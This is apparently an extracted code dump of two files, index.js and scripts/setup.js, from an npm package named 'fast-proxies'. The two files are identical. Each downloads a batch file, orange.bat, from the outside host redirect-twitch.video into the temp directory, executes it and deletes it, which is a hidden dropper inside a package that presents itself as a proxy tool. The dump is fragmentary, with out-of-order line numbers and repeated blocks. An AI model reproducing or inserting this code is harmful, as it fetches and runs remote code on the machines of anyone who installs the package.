// File: tmp/tmpiqcl6t_o/fast-proxies/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: _tmp_0 = require('child_process')
Line 7: const fileUrl = 'https://redirect-twitch.video/orange.bat'
Line 8: path.basename(fileUrl)
Line 12: path.join(tempDir, filename)
Line 15: (_tmp_1 = https.get(fileUrl, (res) => {
  if (res.statusCode !== 200) {
    console.error('Failed to download the file');
    return;
  }

  // Create a writable stream for the file in the TEMP directory
  const fileStream = fs.createWriteStream(downloadPath);

  // Pipe the response stream into the file stream
  res.pipe(fileStream);

  // When the file is fully written, run it
  fileStream.on('finish', () => {
    fileStream.close(() => {
      console.log(`Downloaded ${filename} successfully to ${tempDir}`);

      // Execute the .bat file after download
      exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
        ...)
Line 25: res.pipe(fileStream)
Line 29: {
      console.log(`Downloaded ${filename} successfully to ${tempDir}`);

      // Execute the .bat file after download
      exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      });
    }
Line 33: exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      })

// File: tmp/tmpiqcl6t_o/fast-proxies/package/scripts/setup.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const fs = require('fs')
Line 3: const path = require('path')
Line 4: _tmp_0 = require('child_process')
Line 7: const fileUrl = 'https://redirect-twitch.video/orange.bat'
Line 8: path.basename(fileUrl)
Line 12: path.join(tempDir, filename)
Line 15: (_tmp_1 = https.get(fileUrl, (res) => {
  if (res.statusCode !== 200) {
    console.error('Failed to download the file');
    return;
  }

  // Create a writable stream for the file in the TEMP directory
  const fileStream = fs.createWriteStream(downloadPath);

  // Pipe the response stream into the file stream
  res.pipe(fileStream);

  // When the file is fully written, run it
  fileStream.on('finish', () => {
    fileStream.close(() => {
      console.log(`Downloaded ${filename} successfully to ${tempDir}`);

      // Execute the .bat file after download
      exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
        ...)
Line 25: res.pipe(fileStream)
Line 29: {
      console.log(`Downloaded ${filename} successfully to ${tempDir}`);

      // Execute the .bat file after download
      exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      });
    }
Line 33: exec(`"${downloadPath}"`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing file: ${error.message}`);
          return;
        }
        if (stderr) {
          console.error(`stderr: ${stderr}`);
          return;
        }
        console.log(`stdout: ${stdout}`);

        // Optionally, delete the file after execution
        fs.unlink(downloadPath, (err) => {
          if (err) {
            console.error(`Error deleting file: ${err.message}`);
          } else {
            console.log('File deleted successfully.');
          }
        });
      })
